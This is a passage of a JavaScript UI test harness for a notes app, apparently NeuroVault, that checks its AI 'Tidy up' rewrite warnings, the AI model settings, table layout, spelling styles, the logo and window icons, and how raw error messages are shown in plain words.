      await withApi({ ai_tidy: () => ({ status: 'success', job: 'job-8' }), ...job({ text: 'We meet on Tuesday.', lost: ['[[Roadmap]]'], same: false, by: 'Qwen3.5 4B' }) }, async () => { djCtxRun('ctx-tidy', S.ctx); await until(() => app.querySelector('[data-ain-pop="tidy"] .alert--warning')); });
      N.tidy.lost = app.querySelector('[data-ain-pop="tidy"] .alert--warning')?.textContent.trim() || 'none'; if (!/\[\[Roadmap\]\]/.test(N.tidy.lost)) bad('a lost [[link]] is named before Replace', N.tidy.lost);
      document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await tick(); if (AIN.tidy) bad('Esc closes Tidy up without a change', '');
      // QC 38: a one-paragraph ramble comes back as paragraphs by topic; what it added and how much it cut are named first
      { clearTimeout(n.saveT); n.docDirty = false; n.dirty = false; n.md = 'so basically i sorted the folders lol and then step 4 broke anyway i changed the config\n\nSecond paragraph stays.'; n.html = null; renderAll();
        const d5 = app.querySelector('.doc'), r5 = document.createRange(); r5.selectNodeContents(d5.querySelector('p')); d5.focus({ preventScroll: true }); s2.removeAllRanges(); s2.addRange(r5);
        d5.querySelector('p').scrollIntoView({ block: 'center' }); const b5 = d5.querySelector('p').getClientRects()[0]; (document.elementFromPoint(b5.left + 30, b5.top + b5.height / 2) || d5).dispatchEvent(new MouseEvent('contextmenu', { ...at, clientX: b5.left + 30, clientY: b5.top + b5.height / 2 })); await tick();
        await withApi({ ai_tidy: () => ({ status: 'success', job: 'job-9' }), ...job({ text: 'I sorted the folders.\n\nThen step 4 broke, so I changed the config with Priya.', lost: [], same: false, added: ['Priya'], cut: 35, strength: 'standard', by: 'Qwen3.5 4B' }) }, async () => { djCtxRun('ctx-tidy', S.ctx); await until(() => app.querySelector('[data-act="ain-tidy-replace"]')); });
        const pop5 = app.querySelector('[data-ain-pop="tidy"]'); N.tidy.guard = `${pop5?.querySelector('[data-ain-added]')?.textContent.trim()} · ${pop5?.querySelector('[data-ain-cut]')?.textContent.trim()} · head "${pop5?.querySelector('.ain-head-val')?.textContent}"`;
        if (!/Check this: it added Priya/.test(N.tidy.guard) || !/removed a lot \(35% of the words\)/.test(N.tidy.guard) || !/^Standard/.test(pop5?.querySelector('.ain-head-val')?.textContent || '')) bad('what it added and how much it cut are named before Replace', N.tidy.guard);
        inWin(pop5, '1920 guard', 'Tidy up popover');
        // QC 43: when the guard flags something, Replace is the secondary "Replace anyway" and Cancel is the main button
        const btns5 = [...(pop5?.querySelectorAll('.ain-btns .btn') || [])].map(b => `${b.textContent.trim()}:${b.classList.contains('btn--primary') ? 'main' : 'secondary'}`).join('|');
        N.tidy.flagged = `${btns5} · focus ${document.activeElement?.textContent.trim()}`;
        if (btns5 !== 'Replace anyway:secondary|Cancel:main' || document.activeElement?.textContent.trim() !== 'Cancel') bad('a flagged tidy: [Replace anyway] [Cancel], Cancel the main one', N.tidy.flagged);
        app.querySelector('[data-act="ain-tidy-replace"]').click(); await tick(); syncDoc(n);
        N.tidy.paras = n.md.split('\n\n').join(' ¶ ');
        if (n.md.split('\n\n').length !== 3 || !/^I sorted the folders\.\n\nThen step 4 broke/.test(n.md) || !/Second paragraph stays\.$/.test(n.md.trim())) bad('a ramble replaced by paragraphs keeps them as paragraphs', N.tidy.paras);
        edUndo(app.querySelector('.doc')); syncDoc(n); if (!/^so basically/.test(n.md) || n.md.split('\n\n').length !== 2) bad('Ctrl+Z puts the ramble back as one paragraph', n.md.slice(0, 60));
        // from a range, with nothing selected (Fix A's menuTarget hands Tidy up the paragraph under the pointer: ainTidyRange)
        renderAll(); const d6 = app.querySelector('.doc'), pr = document.createRange(); pr.selectNodeContents(d6.querySelector('p')); getSelection().removeAllRanges();
        let started; const cl6 = await withApi({ ai_tidy: () => ({ status: 'success', job: 'job-10' }), ...job({ text: 'I sorted the folders, then step 4 broke.', lost: [], same: false, added: [], cut: 0, strength: 'standard', by: 'Qwen3.5 4B' }) }, async () => {
          started = ainTidyRange(pr); await until(() => app.querySelector('[data-act="ain-tidy-replace"]')); app.querySelector('[data-act="ain-tidy-replace"]')?.click(); await tick(); });
        syncDoc(n); N.tidy.range = `started ${started} · sent "${cl6.find(c => c[0] === 'ai_tidy')?.[1][0]?.slice(0, 30)}" · "${n.md.split('\n')[0]}"`;
        if (!started || !/^so basically i sorted/.test(cl6.find(c => c[0] === 'ai_tidy')?.[1][0] || '') || n.md.split('\n')[0] !== 'I sorted the folders, then step 4 broke.' || !/Second paragraph stays\./.test(n.md)) bad('Tidy up from a range (no selection): the paragraph is tidied in place', N.tidy.range);
        if (ainTidyRange(document.createRange()) !== false || AIN.tidy) bad('an empty range starts nothing', '');
        // QC 43: a word or two never goes to the model ("fixture" was explained; "criteria" got the example back)
        renderAll(); const d7 = app.querySelector('.doc'), w7 = document.createRange(), t7 = d7.querySelector('p').firstChild; w7.setStart(t7, 0); w7.setEnd(t7, Math.min(5, t7.length)); const w7t = w7.toString();
        const cl7 = await withApi({ ai_tidy: () => ({ status: 'success', job: 'job-11' }) }, async () => { ainTidyRange(w7); await tick(); });
        N.tidy.short = `"${w7t}" · calls ${cl7.map(c => c[0]).join(',') || 'none'} · toast "${S.toast}"`;
        if (cl7.some(c => c[0] === 'ai_tidy') || AIN.tidy || !/Select a sentence or paragraph to tidy/.test(S.toast || '')) bad('a word or two never goes to the model', N.tidy.short);
        S.toast = null; }
      // with no AI the item is greyed with the reason
      aiDemo('none'); AI.st.providers = {}; renderAll(); const d4 = app.querySelector('.doc'); d4.querySelector('p').scrollIntoView({ block: 'center' }); const b4 = d4.querySelector('p').getClientRects()[0];
      (document.elementFromPoint(b4.left + 30, b4.top + b4.height / 2) || d4).dispatchEvent(new MouseEvent('contextmenu', { ...at, clientX: b4.left + 30, clientY: b4.top + b4.height / 2 })); await tick();
      const it2 = app.querySelector('.ain-tidy-item'); N.tidy.off = `${it2?.getAttribute('aria-disabled')} "${it2?.dataset.tip}"`; if (it2?.getAttribute('aria-disabled') !== 'true' || it2.dataset.tip !== 'Enable AI to use this feature') bad('Tidy up greyed with no AI', N.tidy.off);
      djCtxClose(); aiDemo('ready'); size('1920x1080'); renderAll(); }
    // 6 · Settings → AI models: Note summaries, Ask about a note and Tidy up, each its own model; Where answers show (saved)
    { S.setSec = 'ai'; AIS.tab = 'jobs'; set({ modal: 'settings' }); const rows = ['summary', 'qa', 'tidy'].map(k => app.querySelector(`select[data-act="ai-route"][data-k="${k}"]`));
      N.settings.rows = ['summary', 'qa', 'tidy'].map((k, i) => `${app.querySelector('#rt-' + k)?.textContent}: ${rows[i] ? rows[i].options[rows[i].selectedIndex].textContent : 'no select'}`).join(' · ');
      if (rows.some(x => !x) || app.querySelector('#rt-qa')?.textContent !== 'Ask about a note' || /Note summaries and Q&A/.test(app.textContent)) bad('three job rows, each with its own model', N.settings.rows);
      // Ask: what answers can use (ai_ask_mode): my notes, then general knowledge (default) | only my notes
      const modes = [...app.querySelectorAll('[data-act="ain-askmode"]')]; N.settings.mode = modes.map(m => `${m.textContent}${m.getAttribute('aria-pressed') === 'true' ? ' (on)' : ''}`).join(' | ');
      if (modes.map(m => m.dataset.v).join() !== 'general,notes' || modes[0].getAttribute('aria-pressed') !== 'true') bad('Ask: answers can use my notes, then general knowledge (default) | only my notes', N.settings.mode);
      // Tidy up: how much it changes (Light | Standard, the default | Polished) and your own rule (QC 38)
      const strs = [...app.querySelectorAll('[data-act="ain-tidystr"]')], rule = app.querySelector('[data-ain-rule]');
      N.settings.tidy = `${strs.map(m => `${m.textContent}${m.getAttribute('aria-pressed') === 'true' ? ' (on)' : ''}`).join(' | ')} · rule box ${!!rule}`;
      if (strs.map(m => m.dataset.v).join() !== 'light,standard,polished' || strs[1].getAttribute('aria-pressed') !== 'true' || !rule) bad('Tidy up: Light | Standard (default) | Polished, and your own rule', N.settings.tidy);
      strs[0]?.click(); await tick(); if (AIN.tidyStrength !== 'light') bad('Light can be picked', AIN.tidyStrength);
      if (rule) { const rb = app.querySelector('[data-ain-rule]'); rb.value = '  Use British   spelling. '; rb.dispatchEvent(new Event('change', { bubbles: true })); await tick(); if (AIN.tidyRule !== 'Use British spelling.') bad('your own rule is kept, on one line', AIN.tidyRule); }
      AIN.tidyStrength = 'standard'; AIN.tidyRule = ''; renderAll();
      app.querySelectorAll('[data-act="ain-askmode"]')[1]?.click(); await tick(); if (AIN.askMode !== 'notes') bad('Only my notes can be picked', AIN.askMode); AIN.askMode = 'general'; renderAll();
      const card = app.querySelector('#ain-place-card'), opts = [...(card?.querySelectorAll('[data-act="ain-place"]') || [])];
      const calls = await withApi({ save_settings: p => ({ status: 'success', ...p }) }, async () => { opts.find(o => o.dataset.v === 'side')?.click(); await tick(); });
      const saved = calls.find(c => c[0] === 'save_settings')?.[1][0];
      N.settings.place = `${opts.map(o => o.dataset.v).join('/')} · picked side → ${AIN.place} · saves ${JSON.stringify(saved)} · Reset ${!!card?.querySelector('.cf-card-reset')}`;
      if (opts.map(o => o.dataset.v).join() !== 'popover,side,card' || AIN.place !== 'side' || (saved && saved.ai_answer_place !== 'side')) bad('Where answers show: three choices, saved', N.settings.place);
      app.querySelectorAll('.settings-pane .seg-opt, .settings-pane select.field').forEach(x => { if (x.offsetWidth && x.getBoundingClientRect().height > 32.5) bad('one control height on the AI page', `${x.className} ${x.getBoundingClientRect().height}`); });
      AIN.place = 'popover'; set({ modal: null }); S.setSec = 'appearance'; }
    // 8 · The editor batch (QC 50, 53, 56): a rich table uses the room on both sides, centred on the text column (a Markdown table
    //     stays in it); misspellings are dotted in their own colour; the Image button puts a picked image at the caret
    { const E = N.editor = {}, eb = (k, v) => bad('editor ' + k, v);
      for (const sc of ['1920x1080', '1366x768', '3440x1440']) {
        set({ screen: sc, view: 'notes', side: true, inspector: 'shown' }); const n4 = note(); clearTimeout(n4.saveT); n4.docDirty = false; n4.dirty = false;
        const cells = Array.from({ length: 6 }, (_, i) => `<td>Cell ${i} with a fair amount of text in it so that it wants to be wide</td>`).join('');
        n4.md = `Intro line.\n\n<table data-nv-borders="outer"><tbody><tr>${cells}</tr><tr>${cells}</tr></tbody></table>\n\n| a | b |\n| --- | --- |\n| 1 | 2 |\n\nAfter.`; n4.html = null; renderAll(); await tick(3);
        const doc = app.querySelector('.doc'), view = doc.closest('.view--note'), [rich, md] = doc.querySelectorAll('table'), dr = doc.getBoundingClientRect(), rr = rich.getBoundingClientRect(), mr = md.getBoundingClientRect(), vr = view.getBoundingClientRect();
        const dc = (dr.left + dr.right) / 2, rc = (rr.left + rr.right) / 2;
        E[sc] = `doc ${Math.round(dr.width)} · rich ${Math.round(rr.width)} (centre ${Math.round(rc - dc)}px off) in ${Math.round(rr.left - vr.left)}..${Math.round(vr.left + view.clientWidth - rr.right)} · md left ${Math.round(mr.left - dr.left)}`;
        if (Math.abs(rc - dc) > 1.5) eb('a rich table sits centred on the text column', `${sc}: ${E[sc]}`);
        if (rr.width <= dr.width - 34 + 1 && rich.scrollWidth > rich.clientWidth + 1 && (Math.min(dc - vr.left, vr.left + view.clientWidth - dc) * 2 > dr.width + 80)) eb('a rich table uses the room beside the column before it scrolls', `${sc}: ${E[sc]}`);
        if (rr.left < vr.left - 0.5 || rr.right > vr.left + view.clientWidth + 0.5) eb('the rich table stays inside the note’s page', `${sc}: ${E[sc]}`);
        if (Math.abs(mr.left - dr.left - 22) > 1.5) eb('a Markdown table keeps its place in the text column', `${sc}: ${E[sc]}`);
        if (view.scrollWidth > view.clientWidth + 1) eb('the note’s page scrolls sideways', sc);
      }
      set({ screen: '1920x1080' });
      // QC 53: the spelling line is dotted, in the theme's own danger colour (the same shape as the blue style hint)
      for (const th of ['obsidian', 'paper', 'contrast']) { set({ theme: th }); const doc = app.querySelector('.doc'), sp = getComputedStyle(doc, '::spelling-error'), hint = getComputedStyle(app).getPropertyValue('--danger').trim();
        E['spell ' + th] = `${sp.textDecorationStyle} ${sp.textDecorationLine} ${sp.textDecorationColor} (danger ${hint})`;
        if (sp.textDecorationStyle !== 'dotted' || !/underline/.test(sp.textDecorationLine)) eb('misspellings are dotted', `${th}: ${E['spell ' + th]}`); }
      set({ theme: 'obsidian' });
      // QC 56: the Image button is live (no Coming soon) and puts the picked image at the caret, as a line of its own
      const n5 = note(); clearTimeout(n5.saveT); n5.docDirty = false; n5.dirty = false; n5.md = 'First line.\n\nSecond line.'; n5.html = null; renderAll();
      const btn = app.querySelector('[data-fmt="image"]'); E.btn = btn ? `${btn.getAttribute('aria-label')} · soon ${btn.hasAttribute('data-soon')}` : 'none';
      if (!btn || btn.hasAttribute('data-soon')) eb('the Image button is live', E.btn);
      const d5 = app.querySelector('.doc'), t5 = d5.querySelector('p').firstChild; d5.focus({ preventScroll: true }); edPut([t5, t5.length]);
      const cl = await withApi({ image_pick: () => ({ status: 'success', file: 'attachments/pic.png', name: 'pic.png', kind: 'image', size: 70, mtime: '2026-10-18T12:00:00' }) }, async () => { app.querySelector('[data-fmt="image"]').click(); await tick(8); });   // parity (7): the real button
      syncDoc(n5); E.image = `${cl.map(c => c[0]).filter(c => c === 'image_pick').join()} · "${n5.md.replace(/\n/g, ' / ')}"`;
      if (!cl.some(c => c[0] === 'image_pick') || n5.md !== 'First line.\n\n![[attachments/pic.png]]\n\nSecond line.') eb('the picked image goes in at the caret, a line of its own', E.image);
      edUndo(app.querySelector('.doc')); syncDoc(n5); if (/pic\.png/.test(n5.md)) eb('Ctrl+Z takes the image out', n5.md);
      const cl2 = await withApi({ image_pick: () => ({ status: 'cancelled' }) }, async () => { app.querySelector('[data-fmt="image"]').click(); await tick(6); });
      syncDoc(n5); if (n5.md !== 'First line.\n\nSecond line.' || !cl2.length) eb('a cancelled picker changes nothing', n5.md); }
    // 9 · the logo (design profile "The logo wears your theme"; QC 74 "Where it shows"): not in the window bar; large in Settings,
    //     at the foot of its sections, in logoVars of the theme and accent (3 themes × 2 accents); the window icon's 16 / 24 / 32 px
    //     use the bold drawing that fills its square; changing the accent sends the window icon once (five PNGs, debounced)
    if (LOGO.svg.icon && LOGO.svg.mark || (bad('logo checks skipped', 'the logo SVGs didn’t load (in file mode, run Chrome with --allow-file-access-from-files)'), false)) { const G = N.logo = {}, gb = (k, v) => bad('logo ' + k, v), keepAC = { ...AC.picks }, sleep = ms => new Promise(r => setTimeout(r, ms));
      for (let i = 0; i < 50 && !(LOGO.svg.mark && LOGO.svg.icon); i++) await sleep(100);
      const rgb = h => `rgb(${[1, 3, 5].map(i => parseInt(h.slice(i, i + 2), 16)).join(', ')})`;
      for (const th of ['obsidian', 'paper', 'sage']) for (const ac of ACCENT_SETS[th].slice(0, 2).map(x => x[0])) {
        AC.picks[th] = ac; set({ theme: th, screen: '1920x1080', modal: null, side: true }); applyAccent(); renderAll(); await tick();
        const inBar = app.querySelectorAll('.titlebar [data-nv-logo]').length;
        S.setSec = 'appearance'; set({ modal: 'settings' }); await tick();
        const tn = setHeadTones(), want = logoVars({ bg: tn.band, text: tn.fg, accent: tn.acc });   // the dark header (2026-10-19): the logo is drawn for the band
        const m = app.querySelector('.modal--settings .set-head [data-nv-logo]'), ms = m && getComputedStyle(m), key = `${th}/${ac}`;
        const got = m ? Object.fromEntries(Object.keys(want).map(k => [k, ms.getPropertyValue(k).trim()])) : null;
        const ap = m?.querySelector('[style*="--logo-accent"]'), ip = m?.querySelector('[style*="--logo-ink"]'), r = m?.getBoundingClientRect(), nav = app.querySelector('.modal--settings .set-head')?.getBoundingClientRect();
        G[key] = got ? `in the window bar ${inBar} · accent ${got['--logo-accent']} (drawn ${ap && getComputedStyle(ap).fill}) · ink ${got['--logo-ink']} · ${Math.round(r.width)}px · name "${app.querySelector('.set-head-sub')?.textContent}"` : 'missing';
        if (inBar) gb('no logo in the window bar', `${key}: ${inBar}`);
        if (!m || Object.keys(want).some(k => String(got[k]) !== String(want[k]))) gb('the Settings logo’s colours are logoVars of the theme and accent', `${key}: ${JSON.stringify(got)} want ${JSON.stringify(want)}`);
        else if (getComputedStyle(ap).fill !== rgb(want['--logo-accent']) || getComputedStyle(ip).fill !== rgb(want['--logo-ink'])) gb('the Settings logo is drawn in them', `${key}: ${G[key]}`);
        if (m && (Math.round(r.width) < 36 || r.left < nav.left - .5 || r.right > nav.right + .5 || r.bottom > nav.bottom + .5 || app.querySelector('.set-head-sub')?.textContent !== 'NeuroVault')) gb('the Settings logo is in the dark header, beside Settings and NeuroVault', `${key}: ${G[key]}`);
        set({ modal: null });
      }
      // the dark header in every theme (feedback: "for the settings, I prefer a dark header!"): the band dark, the title 7:1 or more, NeuroVault
      // 4.5:1, the logo's accent 3:1, as drawn
      { const hd = [], th0 = READER.theme, lum = h => logoLum(h), rgbHex = c => '#' + (c.match(/\d+/g) || []).slice(0, 3).map(n => (+n).toString(16).padStart(2, '0')).join('');
        for (const [th] of THEMES) { set({ theme: th, modal: null }); applyAccent(); S.setSec = 'appearance'; set({ modal: 'settings' }); await tick();
          const head = app.querySelector('.modal--settings .set-head'), band = rgbHex(getComputedStyle(head).backgroundColor), title = rgbHex(getComputedStyle(head.querySelector('.modal-title')).color), sub = rgbHex(getComputedStyle(head.querySelector('.set-head-sub')).color);
          const acc = head.querySelector('[data-nv-logo]')?.style.getPropertyValue('--logo-accent'), c1 = logoContrast(title, band), c2 = logoContrast(sub, band), c3 = acc ? logoContrast(acc, band) : 0;
          hd.push(`${th} ${band} ${c1.toFixed(1)}/${c2.toFixed(1)}/${c3.toFixed(1)}`);
          const navBg = rgbHex(getComputedStyle(app.querySelector('.modal--settings .settings-nav')).backgroundColor);   // the user: the same as the Settings sidebar, in every theme
          if (band !== navBg || c1 < 4.5 || c2 < 3) gb('the Settings header is the Settings sidebar surface, with readable text', `${th}: head ${band} vs sidebar ${navBg}, title ${c1.toFixed(2)}, NeuroVault ${c2.toFixed(2)}, logo accent ${c3.toFixed(2)}`); }
        G.darkHead = hd.join(' · '); set({ modal: null, theme: th0 }); applyAccent(); }
      // QC 78: the window and taskbar icon is the bare icon (no tile) at every size; at 24 px its drawing fills nearly all of the square
      const used = {}, usedAsk = {}, png0 = logoPng; logoPng = async (svg, v, px) => { if (svg === logoAskSvg(LOGO.svg.icon)) usedAsk[px] = 'ask'; else used[px] = svg === LOGO.svg.icon ? 'icon' : '?'; return png0(svg, v, px); };   // QC 111: the Ask window's icon too   // eslint-disable-line no-global-assign
      const fill24 = await (async () => { const img = new Image(), src = await png0(LOGO.svg.icon, logoNow(), 24); await new Promise((ok, no) => { img.onload = ok; img.onerror = no; img.src = src; setTimeout(ok, 3000); });   // decode() can stall in a hidden page
        const cv = document.createElement('canvas'); cv.width = cv.height = 24; const x = cv.getContext('2d'); x.drawImage(img, 0, 0);
        const d = x.getImageData(0, 0, 24, 24).data; let t = 24, b = -1, l = 24, r = -1; for (let i = 0; i < 576; i++) if (d[i * 4 + 3] > 64) { const yy = i / 24 | 0, xx = i % 24; t = Math.min(t, yy); b = Math.max(b, yy); l = Math.min(l, xx); r = Math.max(r, xx); }
        return { h: b - t + 1, w: r - l + 1, corner: d[3] }; })();
      const noTile = !/<rect/.test(LOGO.svg.icon);
      // the window and taskbar icon: once per change of colours, five square PNGs
      const was = { force: LOGO.force, wait: LOGO.wait }; LOGO.force = true; LOGO.wait = 50; LOGO.want = ''; LOGO.sent = '';
      const calls = await withApi({ window_icon: () => ({ status: 'success', applied: 1 }) }, async (cl) => {
        AC.picks.obsidian = ACCENT_SETS.obsidian[0][0]; set({ theme: 'obsidian' }); applyAccent(); renderAll();
        const main = () => cl.filter(c => c[0] === 'window_icon' && c[1][1] == null);   // QC 111: the app's icon (the Ask window's own comes after it)
        for (let i = 0; i < 50 && !main().length; i++) await sleep(100);
        const first = main().length;
        renderAll(); renderAll(); await sleep(400); const same = main().length - first;
        AC.picks.obsidian = ACCENT_SETS.obsidian[1][0]; applyAccent(); renderAll(); renderAll(); renderAll();
        for (let i = 0; i < 50 && main().length < first + 1; i++) await sleep(100);
        await sleep(400); G.icon = { first, same, after: main().length - first }; });
      logoPng = png0;   // eslint-disable-line no-global-assign
      G.small = `${JSON.stringify(used)} · at 24 px the drawing is ${fill24.w}×${fill24.h} px, its corner ${fill24.corner ? 'drawn' : 'clear'} · no tile ${noTile}`;
      if (LOGO_PX.some(px => used[px] !== 'icon') || fill24.h < 22 || fill24.corner || !noTile) gb('the window icon is the bare icon at every size, filling its square (QC 78)', G.small);
      const ic2 = calls.filter(c => c[0] === 'window_icon' && c[1][1] == null), last = ic2.at(-1)?.[1][0] || {}, askc = calls.filter(c => c[0] === 'window_icon' && c[1][1] === 'ask');
      G.ask = `${askc.length} sent · sizes ${Object.keys(askc.at(-1)?.[1][0] || {}).join(',')} · drawn ${JSON.stringify(usedAsk)} · mark ${/data-nv-ask/.test(logoAskSvg(LOGO.svg.icon))} · accent ${/fill="var\(--logo-accent\)"/.test(LOGO_ASK_MARK)}`;
      if (askc.length !== ic2.length || Object.keys(askc.at(-1)?.[1][0] || {}).join(',') !== '16,20,24,32,40,48,64,256' || LOGO_PX.some(px => usedAsk[px] !== 'ask') || !/mark true · accent true$/.test(G.ask)) gb('QC 111: the Ask window gets its own icon (the logo with a chat mark in the accent) with each change', G.ask);
      const sizes = Object.keys(last).join(','), pngOk = Object.values(last).every(v => /^data:image\/png;base64,/.test(v));
      G.icon = `${JSON.stringify(G.icon)} · sizes ${sizes} · png ${pngOk}`;
      if (!/"first":1,"same":0,"after":1/.test(G.icon) || sizes !== '16,20,24,32,40,48,64,256' || !pngOk) gb('changing the accent sends the window icon once', G.icon);
      Object.assign(LOGO, was); LOGO.want = ''; LOGO.sent = ''; Object.assign(AC.picks, keepAC); applyAccent(); set({ theme: 'obsidian' }); }
    // 7 · one weight: nothing bolds when it's on (the icons, the scope, the place choices)
    { AIC.open = true; renderAll(); const w = new Set([...app.querySelectorAll('.ain-btn, .aic-chip, .aic-sug')].map(x => getComputedStyle(x).fontWeight)); if (w.size > 1) bad('one weight', [...w].join(',')); AIC.open = false; renderAll(); }
    // 8 · v0.1.1 (QC 90): no Python exception text on screen. Raw failures fed in through a toast, nv(), the engine line and a
    // model download come out as one plain sentence; the whole window is then scanned for urlopen / Errno / Traceback / _ssl
    { const PY = /urlopen|Errno|Traceback|_ssl|WinError|getaddrinfo|HTTP Error|CERTIFICATE_VERIFY/i, N9 = N.plain = {};
      const RAWS = ['<urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1006)>',
        '<urlopen error [Errno 11001] getaddrinfo failed>', 'HTTP Error 429: Too Many Requests', '[Errno 28] No space left on device',
        'Traceback (most recent call last):\n  File "local_ai.py", line 460', "[WinError 5] Access is denied: 'C:\\\\x'"];
      const WANT = ['security certificate', "couldn't reach the internet", '(429)', 'disk is full', 'Something went wrong', "didn't let NeuroVault"];
      const scan = where => { const t = app.innerText; if (PY.test(t)) bad('no Python exception text on screen (QC 90)', `${where}: ${t.match(new RegExp('.{0,60}(' + PY.source + ').{0,60}', 'i'))?.[0]}`); };
      N9.say = RAWS.map(r => plainMsg(r)); N9.say.forEach((s, i) => { if (PY.test(s) || !s.includes(WANT[i])) bad('a raw failure becomes its plain sentence', `${RAWS[i].slice(0, 40)} → ${s}`); });
      const te = plainErr(new TypeError("Cannot read properties of undefined (reading 'width')"), "The photo couldn't be edited.");
      if (!/^The photo couldn't be edited\. Something went wrong/.test(te)) bad('a script error becomes a plain sentence', te);
      if (plainMsg('The model file is missing.') !== 'The model file is missing.' || plainMsg('') !== '') bad('plain text stays as it is', plainMsg('The model file is missing.'));
      toast(RAWS[0]); scan('toast'); N9.toast = S.toast?.slice(0, 50); S.toast = null;
      await withApi({ dict_lookup_online: () => ({ status: 'error', message: RAWS[1] }) }, async () => { const r = await nv('dict_lookup_online', 'word'); N9.nv = r.message; if (PY.test(r.message)) bad('nv() turns a raw message plain', r.message); });
      aiDemo('ready'); const dm = AI.st.models.find(m => !m.installed); AI.st.engine.state = 'error'; AI.st.engine.message = RAWS[4];
      AI.st.downloads = { ...AI.st.downloads, [dm.id]: { key: dm.id, state: 'error', message: RAWS[0], done: 10, total: dm.bytes } };
      const alerts = [];
      for (const tab of ['overview', 'pc']) { AIS.tab = tab; set({ modal: 'settings' }); S.setSec = 'ai'; renderAll(); scan('AI settings · ' + tab);
        alerts.push(...[...app.querySelectorAll('.ai-nofit[role="alert"]')].map(x => `${tab}: ${x.textContent.slice(0, 90)}`)); }
      N9.ai = alerts.join(' | ');
      if (!/security certificate/.test(N9.ai) || !/Something went wrong/.test(N9.ai)) bad('the engine and download failures show their plain sentence', N9.ai || 'none shown');
      // must-fix 5: Remove ≠ Delete. A downloaded model's trash deletes the file (Delete); a .gguf you added is only forgotten (Remove)
      const im = AI.st.models.find(m => m.installed), lbl = m => new DOMParser().parseFromString(aisLocalRow(m), 'text/html').querySelector('.ais-rm')?.getAttribute('aria-label') || '';
      N9.trash = `${lbl({ ...im, custom: false })} | ${lbl({ ...im, custom: true })}`;
      if (!/^Delete .* from this PC \(/.test(lbl({ ...im, custom: false })) || !/^Remove .*the file stays/.test(lbl({ ...im, custom: true }))) bad('the trash says Delete for a downloaded model, Remove for an added .gguf', N9.trash);
      set({ modal: null }); AIS.tab = 'overview'; renderAll(); scan('the window');
      // v0.1.1 (Build M's find): Settings → Voice draws in every state. The sample data (no app), an empty config, and statuses
      // a real app could send: none yet, an error, no model, an unknown model, a partial download, a download for another model
      const vKeep = { status: S.voice.status, loading: S.voice.loading, dl: S.voice.dl, cfg: VA.cfg };
      const full = { status: 'success', model: { name: 'base.en', note: 'fast', present: false, folder: 'C:\\m', size_mb: 161 }, models: [{ name: 'base.en', size_mb: 161, note: 'fast' }], mics: ['Mic A'], mic: 'Mic B' };
      const VST = [['sample data', null, false], ['empty config', {}, true], ['status with nothing in it', { status: 'success' }, true], ['an error', { error: RAWS[0] }, true],
        ['an unknown model', { ...full, model: { name: 'tiny.xx' }, models: null, mics: null }, true], ['a partial download', { ...full, download: { stage: 'downloading', name: 'base.en', done: 5e7, total: 1.6e8 } }, true],
        ['a download for another model', { ...full, download: { stage: 'downloading', name: 'small.en', done: 1, total: 2 } }, true], ['installed', { ...full, model: { ...full.model, present: true } }, true]];
      const vOut = [];
      for (const [what, st, live] of VST) {
        const draw = () => { S.voice.status = st; S.voice.loading = live; if (what === 'empty config') VA.cfg = {}; set({ modal: 'settings' }); S.setSec = 'voice'; renderAll();
          const failedPart = app.querySelector('[data-voice-part-failed]'), stt = !!app.querySelector('#stt-l'), txt = app.querySelector('.set-content, .settings, [role="dialog"]')?.innerText || app.innerText;
          vOut.push(`${what}: ${failedPart ? 'a part failed' : stt ? 'ok' : 'no rows'}`);
          if (failedPart || !stt || /\bundefined\b|\bnull\b|NaN/.test(txt)) bad('Settings → Voice draws in every state, in plain words', `${what}: ${failedPart ? 'a part failed' : !stt ? 'no speech rows' : txt.match(/.{0,40}\b(undefined|null|NaN)\b.{0,20}/)?.[0]}`);
          scan('Settings → Voice · ' + what); VA.cfg = vKeep.cfg; };
        try { if (live) await withApi({}, async () => draw()); else draw(); } catch (e) { bad('Settings → Voice draws in every state, in plain words', `${what}: ${e.message}`); VA.cfg = vKeep.cfg; } }
      N9.voice = vOut.join(' · '); Object.assign(S.voice, { status: vKeep.status, loading: vKeep.loading, dl: vKeep.dl }); set({ modal: null }); renderAll(); }
  } finally {
    reset(); AIN.place = keep.place; AIN.askMode = keep.mode; [AIN.tidyStrength, AIN.tidyRule] = keep.tidy; AI.st = keep.st; AI.demo = keep.demo;
    set({ screen: '1920x1080', font: 'opendyslexic', sample: 'typical', view: 'notes', modal: null });
  }
}
/* ==== end Build N ==== */
/* ==== Build P (mockups R48, R48b "all", R48c, 2026-10-17): table controls and rich tables in the note. At 1366 × 768 and 3440 × 1440,
   with a typical table, one wider than the page and the R48c rich sample: the toolbar sits inside the window and clear of the grips;
   the toolbar (with More and its two pickers) and the right-click menu hold the same 41 actions; the toolbar steps aside for the
   right-click menu; menus and pickers stay inside the window; a wide table scrolls inside itself, never the page; the rich table shows
   its tag and saves exactly as it was read. Nothing is copied to the clipboard. Runs in the full sweep, or alone with ?check=1&only=buildp ==== */
/* ==== QC 87 · Use graphics card for AI (?check=1&only=qc87, and in the full sweep): the row is on Settings → AI models → On this PC in every
   state and on every screen, says what each choice does in a plain line, shows the choice that suits this PC, greys out without a
   graphics card, fits the window, and a click changes the choice ==== */
async function checkQc87() {
  out.numbers.qc87 = {};
  for (const sc of Object.keys(SCREENS)) for (const state of ['ready', 'nogpu', 'lowdisk', 'none']) {
    aiDemo(state); AIS.tab = 'pc'; S.setSec = 'ai'; set({ screen: sc, sample: 'typical', view: 'notes', side: true, modal: 'settings' }); out.combos++;
    const k = `qc87/${sc}/${state}`, pane = app.querySelector('.modal--settings .settings-pane'), row = pane?.querySelector('[data-ais-row="gpu"]');
    if (!row) { iss('QC 87: no "Use graphics card for AI" row', k); continue; }
    const opts = [...row.querySelectorAll('[data-act="ais-gpu"]')], on = opts.filter(b => b.getAttribute('aria-pressed') === 'true'), can = state === 'ready' || state === 'none';
    const lines = [...row.querySelectorAll('.ais-gpu-line')].map(l => l.textContent.trim());
    if (row.querySelector('.set-label')?.textContent.trim() !== 'Use graphics card for AI') iss('QC 87: the row’s name', k);
    if (opts.map(b => b.textContent.trim()).join('|') !== 'Off|Some|Full') iss('QC 87: Off, Some, Full', `${k}: ${opts.map(b => b.textContent)}`);
    if (on.length !== 1 || on[0].dataset.v !== (can ? 'some' : 'off')) iss('QC 87: the choice shown should suit this PC (Some with a card, Off without)', `${k}: ${on.map(b => b.dataset.v)}`);
